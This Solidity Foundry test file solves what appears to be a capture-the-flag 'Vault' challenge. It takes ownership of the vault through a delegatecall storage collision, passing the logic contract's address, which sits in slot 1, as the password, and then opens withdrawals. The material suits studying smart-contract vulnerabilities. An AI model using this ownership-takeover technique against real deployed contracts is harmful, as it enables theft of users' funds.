// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // delegatecall 使用 Vault 的存储布局：logic 中 slot1 的 password 与 Vault 中 slot1 的
        // logic 地址重合，故用 bytes32(地址) 可通过 changeOwner，把 vault.owner 改成 palyer。
        bytes32 fakePassword = bytes32(uint256(uint160(address(logic))));
        (bool ok, ) = address(vault).call(abi.encodeWithSelector(VaultLogic.changeOwner.selector, fakePassword, palyer));
        require(ok, "changeOwner failed");
        vault.openWithdraw();
        vm.stopPrank();
        vm.startPrank(owner);
        vault.withdraw();
        vm.startPrank(palyer);
        


        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
